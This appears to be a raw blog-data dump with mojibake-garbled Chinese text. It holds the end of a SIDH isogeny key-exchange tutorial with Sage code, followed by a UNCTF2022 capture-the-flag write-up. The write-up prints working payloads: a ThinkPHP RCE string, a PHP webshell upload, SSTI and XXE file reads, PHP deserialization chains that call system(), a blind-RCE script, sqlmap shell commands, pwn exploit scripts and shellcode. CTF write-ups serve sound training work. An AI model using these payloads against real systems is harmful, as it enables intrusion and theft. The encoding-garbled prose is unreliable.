éšæœºé€‰æ‹©ä¸¤ä¸ªæ•´æ•° $s_B$ å’Œ $t_B$ ä½œä¸ºç§˜å¯†ä¿¡æ¯ï¼Œè®¡ç®— $R_B = s_B P_B + t_B Q_B\\in E$ï¼Œå¹¶ç”± $R_B$ è®¡ç®—å¾—åˆ°ä¸€ä¸ªä» $E$ æ˜ å°„åˆ°å…¶å­ç¾¤ $E_B$ çš„åŒæº $\\phi_B: E \\mapsto E_B$ï¼Œè¿™ä¹Ÿæ˜¯Bobçš„ç§˜å¯†ä¿¡æ¯ï¼› è·å–Aliceçš„å…¬å¼€ä¿¡æ¯ï¼Œå¹¶è®¡ç®— $\\phi_B(P_A)$ å’Œ $\\phi_B(Q_A)$ï¼Œè¿™äº›æ˜¯å…¬å¼€ä¿¡æ¯ï¼› Bobå‘é€å…¬å¼€ä¿¡æ¯ $E_B$ã€$\\phi_B(P_A)$ å’Œ $\\phi_B(Q_A)$ ç»™Aliceã€‚ ç§˜å¯†å€¼çš„è®¡ç®—Aliceè®¡ç®—å­ç¾¤ $E_{BA}$ ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š æ³¨æ„ï¼Œæ­¤æ—¶AliceæŒæ¡çš„ä¿¡æ¯æ˜¯ $s_A$ã€$t_A$ã€$R_A$ã€$\\phi_B(P_A)$ å’Œ $\\phi_B(Q_A)$ï¼Œå¥¹æƒ³è®¡ç®—å¾—åˆ° $\\phi_B(R_A)$ã€‚å¹¶ä¸”è¦å¼ºè°ƒï¼Œ$\\phi_B$ æ˜¯ä¸€ç§ç¾¤åŒæ€ã€‚ åˆ©ç”¨ç¾¤åŒæ€çš„å±æ€§å¯è®¡ç®—å¾—åˆ°ï¼š$\\phi_B(R_A) = \\phi_B(s_A P_A + t_A Q_A) = s_A \\phi_B(P_A) + t_A \\phi_B(Q_A)$ ã€‚ æ ¹æ® $\\phi_B(R_A)$ è®¡ç®— $E_{BA}$ã€‚$E_{BA}$æ˜¯æ›²çº¿ç¾¤ $E$ çš„å­ç¾¤ï¼Œæ˜¯ä»¥ $\\phi_B (R_A)$ ä¸ºKernelçš„ç¾¤åŒæ€æ˜ å°„åˆ° $E$ ä¸Šçš„å­ç¾¤ã€‚è¿™ä¸ªç¾¤åŒæ€ä¹Ÿå°±æ˜¯Isogenyï¼Œè¿™ä¸ªIsogenyè®°ä¸º $\\phi_{BA}$ ã€‚ ç±»ä¼¼çš„ï¼ŒBobå¯ä»¥è®¡ç®—å­ç¾¤ $E_{AB}$ï¼š $\\phi_A(R_B) = s_B \\phi_A(P_B) + t_B \\phi_A(Q_B)$ï¼› ç”±æ­¤å¯è®¡ç®—å¾— $E_{AB}$ ï¼› æœ€åå†²é¡¶çš„ä¸€æ­¥ï¼Œè®¡ç®—ç§˜å¯†å€¼ã€‚é¦–å…ˆè¦æ˜ç¡®ï¼Œå¾ˆå¯èƒ½ $E_{BA} \\ne E_{AB}$ï¼Œä½†æ˜¯ï¼Œ$E_{BA}$ åŒæ„äº $E_{AB}$ã€‚åˆ©ç”¨åŒæ„æ›²çº¿çš„ä¸€ä¸ªå±æ€§ï¼šæ‰€æœ‰åŒæ„æ›²çº¿çš„J-Invariantå€¼ç›¸åŒã€‚äºæ˜¯Aliceå’ŒBobåˆ†åˆ«è®¡ç®—è¿™ä¸¤æ¡æ›²çº¿çš„J-Invariantå€¼ $J(E_{BA})$ å’Œ $J(E_{AB})$ï¼Œè¿™å°±æ˜¯ä»–ä»¬å…±åŒæ‹¥æœ‰çš„ç§˜å¯†ã€‚J-Invariantçš„è®¡ç®—å®šä¹‰å¯åœ¨æ ‡å‡†æ•™ç§‘ä¹¦ä¸­æ‰¾åˆ°ï¼Œæœ¬æ–‡æŠŠå®ƒè§†ä¸ºé»‘ç›’å­ä½¿ç”¨ã€‚ Sageä»£ç å‚æ•°è®¾ç½® 1234567891011121314151617181920#é€‰å–ä¸€æ¡åœ¨ç´ åŸŸkä¸Šçš„è¶…å¥‡å¼‚æ¤­åœ†æ›²çº¿lA, lB = 2, 3eA, eB = 6, 7p = lA ^ eA * lB ^ eB - 1assert p.is_prime()assert p % 4 == 3k = GF(p) # æ³¨æ„ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯æ ‡å‡†åšæ³•ï¼Œåªæ˜¯å› ä¸ºSageçš„å±€é™ä¸å¾—å·²E = EllipticCurve(k, [1, 0]) #é€‰å–æ›²çº¿EE.is_supersingular() # çœ‹çœ‹æ‰€ç”Ÿæˆçš„æ›²çº¿æ˜¯å¦è¶…å¥‡å¼‚.print(E.j_invariant())#é€‰å–å››ä¸ªéšæœºç‚¹ä½œä¸ºå…¬å…±å‚æ•°points = []while len(points) != 4: p = E.random_point() if p not in points: points.append(p)PA, PB, QA, QB = pointsPA, PB, QA, QB Alice çš„æ“ä½œ 12345678910111213141516#Aliceé€‰æ‹©ä¸¤ä¸ªéšæœºæ•°å¹¶è®¡ç®—è‡ªå·±çš„ç§˜å¯†å€¼RA#RAå®šä¹‰äº†phi_Açš„kernelsA, tA = 123, 525RA = sA * PA + tA * QAprint(RA)#phiAå°±æ˜¯åŒæºä¹Ÿæ˜¯ç¾¤åŒæ€phiA = E.isogeny(RA)#Aliceçš„å…¬å…±ä¿¡æ¯EAEA = phiA.codomain()print(E.is_isogenous(EA)) # ç¡®è®¤EAä¸EåŒæº#Aliceå‘é€ä»¥ä¸‹ä¿¡æ¯ç»™BobEA, phiA_PB, phiA_QB = EA, phiA(PB), phiA(QB)EA, phiA_PB, phiA_QB Bob çš„æ“ä½œ 123456789101112131415#Bobçš„å·¥ä½œç±»ä¼¼sB, tB = 812, 580RB = sB * PB + tB * QBprint(RB)#phiBå°±æ˜¯ä»Eåˆ°EBåŒæ€æ˜ å°„,Kernelæ˜¯RBphiB = E.isogeny(RB)#Bobçš„å…¬å…±ä¿¡æ¯EBEB = phiB.codomain()print(E.is_isogenous(EB)) # ç¡®è®¤EBä¸EåŒæº# Bobå‘é€ä»¥ä¸‹ä¿¡æ¯ç»™AliceEB, phiB_PA, phiB_QA = EB, phiB(PA), phiB(QA)EB, phiB_PA, phiB_QA ç§˜å¯†å€¼è®¡ç®— 1234567891011121314151617# Aliceè®¡ç®—ç§˜å¯†å€¼R_BA = sA * phiB_PA + tA * phiB_QAprint(R_BA)phiBA = EB.isogeny(R_BA)print(phiBA)KA = phiBA.codomain().j_invariant()# Bobè®¡ç®—ç§˜å¯†å€¼R_AB = sB * phiA_PB + tB * phiA_QBprint(R_AB)phiAB = EA.isogeny(R_AB)print(phiAB)KB = phiAB.codomain().j_invariant()#æµ‹è¯•ç§˜å¯†å€¼æ˜¯å¦ç›¸ç­‰if KA == KB: print(&quot;Success!&quot;) Castryck-Decruæ”»å‡»ï¼ˆå¾…è¡¥å……ï¼‰ å‚è€ƒï¼š Castryck-Decru-SageMath An efficient key recovery attack on SIDH Castryck-Decru Key Recovery Attack on SIDH","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"åé‡å­å¯†ç ","slug":"åé‡å­å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"UNCTF2022-å…¬å¼€èµ›","slug":"match-UNCTF2022-å…¬å¼€èµ›","date":"2022-11-18T11:43:08.000Z","updated":"2022-11-20T17:32:45.560Z","comments":true,"path":"2022/11/18/match-UNCTF2022-å…¬å¼€èµ›/","permalink":"https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"â€‹ ä¸ºæ·±å…¥è´¯å½»ä¹ è¿‘å¹³æ€»ä¹¦è®°å…³äºäºŒåå¤§æå‡ºçš„ç½‘ç»œå¼ºå›½çš„é‡è¦æ€æƒ³ï¼Œå›´ç»•å»ºè®¾ç½‘ç»œå¼ºå›½çš„æˆ˜ç•¥éƒ¨ç½²ï¼Œå»ºè®¾ç½‘ç»œå¼ºå›½çš„æˆ˜ç•¥éƒ¨ç½²è¦ä¸â€œä¸¤ä¸ªä¸€ç™¾å¹´â€å¥‹æ–—ç›®æ ‡åŒæ­¥æ¨è¿›ï¼Œç”±å¾¡ä¹‹å®‰æ‰¿åŠUNCTF2022ç½‘ç»œå®‰å…¨å¤§èµ›ï¼ˆä»¥ä¸‹ç®€ç§°â€œå¤§èµ›â€ï¼‰å°†äºä»Šå¹´11æœˆä»½å¬å¼€ï¼Œä»¥èµ›äº‹ä¸ºå¥‘æœºï¼Œæå‡ç½‘ç»œå®‰å…¨ä¿éšœèƒ½åŠ›ï¼Œæ±‡èšé«˜ç«¯ç½‘ç»œå®‰å…¨äººæ‰ï¼Œå…±ç­‘ç½‘ç»œå®‰å…¨é˜²çº¿ï¼Œä¸ºä¸­å›½ç½‘ç»œå®‰å…¨äº‹ä¸šå‘å±•æä¾›æ™ºåŠ›æ”¯æ’‘å’Œä¿éšœã€‚ çº¿ä¸ŠæŠ¥åï¼š2022å¹´10æœˆ24æ—¥10:00-11æœˆ11æ—¥10:00ï¼Œæ¯”èµ›æ—¶é—´ï¼š2022å¹´11æœˆ12æ—¥12:00-11æœˆ18æ—¥12:00 Rank: 1 # Webæˆ‘å¤ªå–œæ¬¢bilibiliå¤§å­¦å•¦phpinfoé¡µé¢ç¯å¢ƒå˜é‡ä¸­ç›´æ¥æ³„éœ²flagã€‚ â€‹ ezgame ç®€å•çš„æ¸¸æˆ~ æ‰“è¿‡bosså°±èƒ½è·å¾—flag F12æŸ¥çœ‹jsï¼Œåœ¨main.jsé‡Œæœç´¢ unctfï¼Œåœ¨æ··æ·†jsä»£ç ä¸­æ‰¾åˆ°flagç‰‡æ®µï¼Œè¿æ¥èµ·æ¥å¾—ï¼šunctf&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;ã€‚ â€‹ ç­¾åˆ° åˆæ˜¯ä¸€é“ç®€å•çš„ç­¾åˆ° F12å‘ç°æ³¨é‡Šæœ‰å­¦å· 20200101 ä¸ºè´¦å·å¯†ç ï¼Œå°è¯• 20200102/20200103/20200104/20200105 åˆ†åˆ«å›æ˜¾ f/l/a/gï¼Œè„šæœ¬éå†æå–ï¼š 123456789import requestsurl = &#x27;http://365172a3-2701-4e1a-8f59-a548f14e7027.node.yuzhian.com.cn/index.php&#x27;flag = &#x27;&#x27;for i in range(20200102,20200102+40): data = &#123;&#x27;username&#x27;:f&#x27;&#123;i&#125;&#x27;,&#x27;password&#x27;:&#x27;&#x27;&#125; r = requests.post(url,data=data) flag += r.text[-5][0] print(flag) â€‹ babyphpå¼±ç±»å‹æ¯”è¾ƒã€‚ç¬¬ä¸€å±‚ï¼Œ16è¿›åˆ¶0xç»•è¿‡ï¼›ç¬¬äºŒå±‚ï¼Œæ•°ç»„ç»•è¿‡ï¼›ç¬¬ä¸‰å±‚ï¼Œç”¨å…¶ä»–å‘½ä»¤å’Œé€šé…ç¬¦ç»•è¿‡RCEã€‚ Payloadï¼š /index.php?code=print_r(exec(&quot;uniq%09/fl*&quot;));ï¼ŒPOSTï¼ša=0x&amp;key1[]=a&amp;key2[]=b â€‹ easy_upload ç®€ç®€å•å•çš„æ–‡ä»¶ä¸Šä¼  æ— è¿‡æ»¤çš„æ–‡ä»¶ä¸Šä¼ ã€‚ä¸Šä¼ ä¸€ä¸ª 1.phpï¼Œå†…å« &lt;?php system($_GET[x]);ï¼Œå†è®¿é—®ä¼ å…¥å‘½ä»¤RCEã€‚ Payloadï¼š/uplO4d/1.php?x=cat%20/home/ctf/flag â€‹ ç»™ä½ ä¸€åˆ€ThinkPHP 5.0.xæœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCEæ¼æ´ã€‚ Payload: ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env flag: UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125; â€‹ 302ä¸æ·±å¤§ thaiæƒ³è®©ä½ çŸ¥é“szuçš„æˆ˜é˜Ÿâ€¦â€¦å—ï¼Œé†’é†’ï¼Œè¿™ä¸ªé¡µé¢ä¸æ˜¯ä¸»é¡µï¼ Requestå¤´çš„è€ƒå¯Ÿã€‚ 123/?miku=puppyPOST: micgo=ikunCookie: admin=true flag: UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125; â€‹ easy ssti phpçœ‹è…»äº†ï¼Œæ¥ç‚¹pythonå§ åŸºæœ¬æ— è¿‡æ»¤çš„SSTIã€‚ Payloadï¼š /registerï¼ŒPOSTï¼šuser=&#123;&#123;cycler.__init__.__globals__.os.popen('env').read()&#125;&#125;&amp;pwd= â€‹ å¬è¯´phpæœ‰ä¸€ä¸ªxxeXXEã€‚å…ˆè®¿é—® /hintï¼Œå†è®¿é—® /dom.phpï¼Œæ ¹æ® DOMDocument::loadXML()ä¿¡æ¯ï¼ŒPOSTä¸€ä¸ªXMLæ•°æ®è¯»flagï¼š 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; â€‹ ezunseri å¥½åƒè¿˜æ²¡æœ‰ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Ÿ ååºåˆ—åŒ–é“¾ï¼šLogin:__destruct() =&gt; Exec:__get() =&gt; Test:__toString() =&gt; Exec:__invoke() =&gt; Exec:execute() æ„é€ ï¼š 1234567891011121314151617181920212223from phpserialize import serializefrom urllib.parse import quoteclass Exec: public_content=&#x27;system(&quot;cat /flag&quot;);&#x27; class Test: public_test=Exec() public_key=&#x27;?&#x27; class Exec: public_content=Test() class Login: private_name=&#x27;&#x27; public_code=&#x27;3.1415926&#x27; public_key=Exec()print(quote(serialize(Login())))# O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D# ç»•__wakeup():# O%3A5%3A%22Login%22%3A4%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D â€‹ poppopååºåˆ—åŒ–é“¾ï¼šB:__destruct() =&gt; C:__toString() =&gt; A:__call() æ„é€ ï¼š 1234567891011121314151617from phpserialize import serializefrom urllib.parse import quoteclass A: public_code=&#x27;system(&quot;env&quot;);&#x27;; class C: private_key2=A() class B: public_key=C() print(quote(serialize(B()))) # O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D# ç»•__wakeup():# O%3A1%3A%22B%22%3A2%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D â€‹ babynode ä½ èƒ½æ±¡æŸ“å¯¹è±¡å— åŸå‹é“¾æ±¡æŸ“ã€‚ Payloadï¼š POSTï¼š &#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125; â€‹ easy_rce rceå¸ƒå°”ç›²æ³¨ æ— å›æ˜¾RCEï¼Œå¯ä»¥é‡‡ç”¨ if+head+cut+sleep æ–¹å¼é€ä½çŒœè§£flagå„ä¸ªå­—ç¬¦ã€‚ 123456789101112131415161718192021222324import requestsimport stringimport timeurl = &#x27;http://c88b47e2-7088-4011-8d20-f4e5677e765e.node.yuzhian.com.cn/?code=&#x27;dic = string.ascii_letters+string.digits+&#x27;&#123;-&#125;&#x27;flag = &#x27;&#x27;for i in range(1,50): judge = 0 for j in dic: now = f&#x27;&#123;url&#125;a=$(tac /f?ag | head -1 | cut -b &#123;i&#125;)%0aif [ $a = &#123;j&#125; ]%0athen sleep 2%0afi&#x27; start = time.time() r = requests.get(now) end = time.time() if int(end)-int(start) &gt; 1: judge = 1 flag += j print(flag) break if judge == 0: break print(flag) â€‹ éšä¾¿æ³¨ å¥½åƒè§è¿‡ï¼Œåˆå¥½åƒä¸æ˜¯ sqlmapèƒ½è·‘å‡ºï¼š 12345sqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; --dbssqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; -D ctftraining --tablessqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; -D ctftraining -T FLAG_TABLE --sql-shellsql-shell&gt; select load_file(&quot;/flag&quot;); â€‹ ez2048F12åœ¨game.jså†…æŸ¥çœ‹å…³é”®ä»£ç ï¼Œä¸ºé¦–é¡µinvite_codeéªŒè¯é€»è¾‘ï¼š 1234567891011121314151617181920212223242526272829303132333435363738checkInvited() &#123; let args = [...arguments]; let buf = new ArrayBuffer(24); const view = new DataView(buf); view.setUint8(0, 68); view.setUint8(1, 51); view.setUint8(2, 15); view.setUint8(3, 80); view.setUint16(4, 0x0e5d, true); view.setUint16(6, 0x323a, true); view.setUint16(8, 0x3058, true); view.setUint16(10, 0x1a2a, true); view.setUint32(12, 0x0512160d, true); view.setUint32(16, 0x02560002); view.setUint32(20, 0x130000); function check(code) &#123; if (code.length !== 24) return false; let encode = []; for (let i = 0; i &lt; code.length; i++) &#123; if (~i % 2 === 0) &#123; encode.push(code.charCodeAt(i) ^ code.charCodeAt(i - 2)); &#125; else &#123; encode.push(code.charCodeAt(i) ^ code.charCodeAt(i + 1)); &#125; &#125; for (let i = 0; i &lt; code.length; i++) &#123; if (view.getInt8(i) !== encode[i]) return false; &#125; return true; &#125; return function () &#123; if (!!arguments.length) &#123; [].push.apply(args, arguments); return arguments.callee; &#125; return check(args.join(&quot;&quot;)); &#125;; &#125; å†™ç®€å•è„šæœ¬è¿˜åŸè¾“å…¥ï¼š 1234567891011121314c = [68,51,15,80,93,14,58,50,88,48,42,26,13,22,18,5,2,86,0,2,0,19,0,0]print(len(c))t = [-1]*24t[1] = c[1]t[0] = t[1]^c[0]for i in range(3,24,2): t[i] = t[i-2]^c[i] t[i-1] = t[i]^c[i-1]print(bytes(t))# b&#x27;w3lc0me_7o_unctf2022!!!!&#x27; å†è§‚å¯Ÿå‘ç°å­˜åœ¨game.wasmï¼Œä½¿ç”¨wabtå·¥å…·é€†wasmå¾—åˆ°å¯†æ–‡ \\x22&#125;/7v\\x16\\x0d&gt;GV&amp;*\\x5cS@^mWS_D~V\\x10\\x03[3\\x16^\\x0eR9\\x05_mG\\x10\\x1efalse\\x00ï¼Œå°è¯•ä¸å‰é¢å¾—åˆ°çš„invite_codeå¼‚æˆ–ï¼Œå¾—åˆ° UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;..^CW2ã€‚ â€‹ ä¸–ç•Œå’Œå¹³ æç¤º1ï¼šå †å æ³¨å…¥ æ ¹æ®æç¤ºè¿›è¡Œå †å æ³¨å…¥ï¼š 123450;show databases;#æ•°æ®åº“å score_mbamission/score_minnesotaunited/snert0;show tables;# è¡¨å Flag/users ä½¿ç”¨ 0;select * from Flag æŸ¥æ‰¾Flagè¡¨ä¸­å†…å®¹ï¼Œå‘ç°æ— å›æ˜¾ï¼ŒçŒœæµ‹å¯¹ select æˆ– from æˆ– Flag æœ‰è¿‡æ»¤ã€‚ å°è¯• 0;seLseLectect version();#ï¼Œåªç”¨ select å¤§å†™+åŒå†™å¯ä»¥ç»•è¿‡å¾—åˆ°å†…å®¹ï¼Œåˆ™ å†ç”¨ 0;seLseLectect * fRfRomom FlFlagag;# å³å¯æ‹¿åˆ°flagã€‚ â€‹ å¿«ä¹ä¸‰æ¶ˆ æ‰“CTFç´¯äº†æ¥ç©ä¸‰æ¶ˆæ”¾æ¾ä¸€ä¸‹å­ æŸ¥çœ‹æºç ï¼Œé™¤äº†è¿›å…¥ /h5/index.php å’Œ /h4/king.phpï¼Œæ²¡æœ‰å…¶ä»–æœ‰ç”¨ä¿¡æ¯ã€‚ æ‰«ç›®å½•å‘ç° /.git/ å’Œ /admin/ï¼Œç”¨GitHackè¿˜åŸå‡º index.php å’Œ phpinfo.phpï¼Œæ— æœ‰ç”¨ä¿¡æ¯ã€‚ ç”¨ admin/unctf è¿›å…¥åå°é¡µé¢ï¼Œ åœ¨ç½‘é¡µé¢„è§ˆåŠŸèƒ½å‘ç°urlä¸º /admin/fi.php?filename=index.phpï¼Œå°è¯•å‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè®¿é—® /admin/fi.php?filename=/flag å¾—åˆ°flagã€‚ â€‹ # PwnwelcomeUNCTF2022 easy easy easy Pwn ç­¾åˆ°pwnã€‚ 12345from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,37591)r.sendline(&#x27;UNCTF&amp;2022\\x00&#x27;)r.sendline(&#x27;cat /flag&#x27;)print(r.recvall()) â€‹ çŸ³å¤´å‰ªåˆ€å¸ƒä¼ªéšæœºæ•°ç»„ï¼Œç»™äº†srandç§å­å€¼ï¼Œä¾ç…§ä»£ç é€»è¾‘æ±‚å‡ºå›ºå®šç§å­å€¼ä¸‹çš„100ä¸ªrandå€¼ï¼š [1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2] å†æ ¹æ®çŸ³å¤´å‰ªåˆ€å¸ƒè§„åˆ™å®ŒæˆååŠéƒ¨åˆ†äº¤äº’ï¼š 123456789101112131415161718192021from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,30253)rand = [1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2]need = []for i in range(100): if rand[i] == 0: need.append(2) elif rand[i] == 1: need.append(0) elif rand[i] == 2: need.append(1)r.recvuntil(&#x27;pwn later?(y/n)\\n&#x27;)r.sendline(&#x27;y&#x27;)for i in range(100): print(r.recvuntil(&#x27;]\\x1B[0m\\n&#x27;)) r.sendline(str(need[i])) print(i,r.recvline())r.interactive() â€‹ checkinæµ‹è¯•ç¬¦åˆæ¡ä»¶çš„æ•°ï¼š 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef unsigned int uint32;#define _DWORD uint32#define LODWORD(x) (*((_DWORD*)&amp;(x)))int main()&#123; size_t nbytes; char nptr[32]=&quot; -33&quot;; LODWORD(nbytes) = atoi(nptr); printf(&quot;%d\\n&quot;,atoi(nptr)); printf(&quot;%x\\n&quot;,nptr[0]); if ( atoi(nptr) &gt; 32 || nptr[0] == 0x2D ) &#123; puts(&quot;No!!Hacker&quot;); &#125; printf(&quot;%u&quot;,(unsigned int)nbytes); return 0;&#125; äº¤äº’ï¼š 123456789101112from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,39482)r.recvuntil(&#x27;name: \\n&#x27;)r.send(&#x27;xx&#x27;)r.recvuntil(&#x27;size: \\n&#x27;)r.send(&#x27; -33&#x27;)pl = &#x27;a&#x27;*(0x50+8)+p64(0x4008c3)r.send(pl)r.interactive() â€‹ int 0x80 easy easy easy Pwn ret2shellcodeï¼Œå…¶ä¸­çš„ __ctype_b_loc å‡½æ•°çš„ä½œç”¨å¯å‚è€ƒ ctype/ctype.h æºç ï¼Œå°†è¾“å…¥çš„å­—ç¬¦æ ¹æ® ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8)) è¿›è¡Œå¤„ç†ï¼Œç„¶åæ ¹æ®ä¸‹é¢è¡¨å¯¹åº”çš„å†…å®¹è¿”å›ã€‚å‚è€ƒ 2021 å¤©ç¿¼æ¯ pwn ezshellã€‚ s[i] &amp; 0x4000 != 0 æ„æ€å³è¦æ±‚çš„è¾“å…¥å­—ç¬¦æ˜¯å¯è§å­—ç¬¦ã€‚ å‚è€ƒ mrctf2020_shellcode_revengeï¼Œä½¿ç”¨å…¨å¯è§å­—ç¬¦shellcodeè¾“å…¥å³å¯ï¼š 12345678910from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,32261)r.recvline()r.send(&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;)r.interactive()# UNCTF&#123;h3ll0_w_0_r_1_d&#125; â€‹ # Reversewhereisyourkey ä½ èƒ½æ‰¾åˆ°å±äºä½ çš„keyå—ï¼Ÿ ç®€å•æ›¿æ¢åŠ å¯†ã€‚ 1234567891011s = [121, 101, 115, 105, 97, 107, 102, 108, 97, 103]for i in range(len(s)): if s[i] == 109: pass elif s[i] &lt;= 110: s[i] -= 2 elif s[i] &gt; 111: s[i] += 3print(bytes(s))# b&#x27;yesiamflag&#x27; â€‹ ezzzzre reç­¾åˆ°é¢˜ exeinfoå‘ç°UPXå£³ï¼Œè„±å£³åï¼ŒIDAä¸­åˆ†æé€»è¾‘ï¼Œé¡ºç€å®ç°å¾—flagï¼š 12345s = list(b&#x27;HELLOCTF&#x27;)out = [2*k-69 for k in s]print(bytes(out))# b&#x27;KESSYAcG&#x27; â€‹ Sudokuæ•°ç‹¬åˆ¤å®šé€»è¾‘ã€‚ç›´æ¥è¿è¡Œæ˜¾ç¤ºçš„æ•°ç‹¬æ˜¯é”™çš„ï¼ŒåŠ¨è°ƒè·å–æ­£ç¡®çš„æ•°ç‹¬åˆå§‹æ•°ç»„ï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£äº†åå¡«å…¥ä¸ºï¼š [8, 5, 2, 4, 9, 1, 6, 7, 3, 1, 9, 6, 7, 3, 8, 2, 5, 4, 4, 3, 7, 5, 6, 2, 9, 1, 8, 5, 2, 8, 1, 4, 6, 3, 9, 7, 3, 7, 4, 9, 2, 5, 8, 6, 1, 9, 6, 1, 3, 8, 7, 4, 2, 5, 2, 1, 9, 8, 5, 4, 7, 3, 6, 7, 4, 3, 6, 1, 9, 5, 8, 2, 6, 8, 5, 2, 7, 3, 1, 4, 9] ä¾æ¬¡è¾“å…¥åå¾—åˆ° Y0u_Ar3_R1ght!Th1s_1s_your_f1aaag! UNCTF&#123;chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)&#125; å…¶ä¸­ vme=50ï¼Œå³flagï¼šUNCTF&#123;OAOJYKOFR&#125;ã€‚ â€‹ haloexeinfoå‘ç°UPXå£³ï¼Œè„±å£³åï¼ŒIDAä¸­åˆ†æé€»è¾‘ï¼Œä¸ºä¸¤è½®å¼‚æˆ–ï¼Œè¿˜åŸï¼š 12345678910111213141516s = [85, 11, 104, 12, 115, 62, 12, 58, 93, 27, 33, 117, 79, 32, 76, 113, 88, 123, 89, 44, 0, 119, 88, 119, 14, 114, 91, 38, 11, 112, 10, 119, 102, 119, 54, 118, 55, 118, 98, 114, 109, 39, 63, 119, 38, 38]s = [s[i]^0x33 for i in range(len(s))]print(s)for i in range(len(s)-1,0,-1): s[i] ^= s[i-1]^iprint(bytes(s))# b&#x27;f_ag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;-&#x27;# ä¿®æ­£ï¼šflag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125; â€‹ HelloRust å¿«æ¥é€†é€†è¿™ä¸€å¨ç­”è¾©ç½¢ IDAæ‰“å¼€ï¼Œåˆ†æä»£ç é€»è¾‘ï¼Œè¯†åˆ«ä¸ºRC4ç®—æ³•ï¼Œæ‰¾åˆ°å¯†æ–‡hexå€¼ 